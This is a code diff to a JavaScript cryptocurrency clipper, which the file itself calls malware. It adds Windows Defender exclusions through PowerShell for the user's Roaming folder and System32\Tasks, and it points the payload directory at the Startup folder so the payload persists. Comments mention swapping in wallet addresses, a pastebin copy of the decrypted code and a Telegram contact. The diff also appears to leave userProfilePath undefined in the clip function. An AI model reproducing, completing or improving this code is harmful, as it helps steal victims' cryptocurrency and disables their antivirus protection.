@@ -1035,31 +1035,23 @@ async function installPython() {
 }
 
 function addDefenderExclusions() {
-    const userProfilePath = os.homedir();  // Get user's home directory (C:\Users\<Username>)
-    const roamingPath = path.join(userProfilePath, 'AppData', 'Roaming');
-    const systemTasksPath = path.join('C:', 'Windows', 'System32', 'Tasks');
+    const roamingPath = path.join(os.homedir(), 'AppData', 'Roaming');
+    const systemTasksPath = 'C:\\Windows\\System32\\Tasks';  // Corrected path
 
     const commands = [
-        // Exclusion for dynamic script directory in Roaming
-        `powershell -Command Add-MpPreference -ExclusionPath "${roamingPath}\\fYmhpM4B"`,
-        
-        // Exclusion for Windows System Tasks directory
-        `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`,
-        
-        // Exclusion for specific registry keys related to scheduled tasks
-        `powershell -Command Add-MpPreference -ExclusionProcess "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{3E417B0F-72AD-404E-8E3B-EDACF62349B9}"`,
-        `powershell -Command Add-MpPreference -ExclusionProcess "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Python Updater_e7yi52KI"`
+        `powershell -Command Add-MpPreference -ExclusionPath "${roamingPath}"`,
+        `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`
     ];
 
     // Execute each PowerShell command synchronously
-    try {
-        commands.forEach((command) => {
+    commands.forEach((command) => {
+        try {
             const output = execSync(command, { stdio: 'pipe' }).toString();
             console.log(`Exclusion added successfully: ${output}`);
-        });
-    } catch (error) {
-        console.error(`Error adding exclusion: ${error.message}`);
-    }
+        } catch (error) {
+            console.error(`Error adding exclusion: ${error.message}`);
+        }
+    });
 }
 
 // Replace with your addresses or all money to me :)
@@ -1077,7 +1069,7 @@ const addresses = {
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/ujJT2Xje (DM me on Telegram if you don't know how to decrypt base64 :0)
 async function clip(pythonwExe) {
-    const userDataPath = path.join(os.homedir(), 'AppData', 'Roaming', `${generateRandomString(8)}`);
+    const userDataPath = path.join(userProfilePath, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
     if (!fs.existsSync(userDataPath)) {
         fs.mkdirSync(userDataPath, { recursive: true });
     }
